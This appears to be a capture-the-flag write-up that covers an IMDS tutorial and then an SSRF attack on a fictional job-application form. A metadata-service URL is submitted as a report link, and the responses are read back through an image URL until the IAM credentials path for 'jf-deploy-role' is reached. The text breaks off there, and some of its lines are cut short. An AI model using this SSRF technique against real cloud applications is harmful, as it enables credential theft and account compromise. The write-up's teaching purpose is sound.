## Challenge: IMDS exploration

```text
ðŸŽ„ðŸŽ„ðŸŽ„ Prof. Petabyte here. In this lesson you'll continue to build your
ðŸŽ„ðŸŽ„ðŸŽ„ cloud asset skills, interacting with the IMDS using curl.
ðŸŽ„ðŸŽ„ðŸŽ„ If you get stuck, run 'hint' for assitance.
```

> The Instance Metadata Service (IMDS) is a virtual server for cloud assets at
> the IP address 169.254.169.254. Send a couple ping packets to the server.

```sh
$ ping 169.254.169.254
PING 169.254.169.254 (169.254.169.254) 56(84) bytes of data.

```

> IMDS provides information about currently running virtual machine instances.
> You can use it to manage and configure cloud nodes. IMDS is used by all major
> cloud providers.
> Different providers will have different formats for IMDS data. We're using an
> AWS-compatible IMDS server that returns 'latest' as the default response.
> Access the 'latest' endpoint. Run `curl http://169.254.169.254/latest`

```sh
$ curl http://169.254.169.254/latest
dynamic

```

> IMDS returns two new endpoints: dynamic and meta-data. Lets start with the
> dynamic endpoint, which provides information about the instance itself. Repeat
> the request to access the dynamic endpoint: `curl http://169.254.169.254/latest/dynamic`.

```sh
$ curl http://169.254.169.254/latest/dynamic
fws/instance-monitoring
instance-identity/document
instance-identity/pkcs7
instance-identity/signature
```

> The instance identity document can be used by developers to understand the

> Much of the data retrieved from IMDS will be returned in JavaScript Object

> Here we see several details about the instance when it was launched.
> Developers can use this information to optimize applications based on the

> In addition to dynamic parameters set at launch, IMDS offers metadata about

>
> By accessing the metadata elements, a developer can interrogate information

[AWS documentation for IMDS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)

Value submitted for form field "URL to your public NLBI report":
<http://169.254.169.254>

![Form result](img/frosttower01.png)

Taking the URL of the not displayed image:

```shell
$ curl https://apply.jackfrosttower.com/images/ABC.jpg
latest
```

Bingo !

Next using `http://169.254.169.254/latest/meta-data/iam/security-credentials`
and curl'ing the image URL again:

```sh
$ curl https://apply.jackfrosttower.com/images/ABC.jpg
jf-deploy-role
```

Next, querying for the credentials of the 'jf-deploy-role'
with
`http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role`
and curl'ing the image URL again yields:
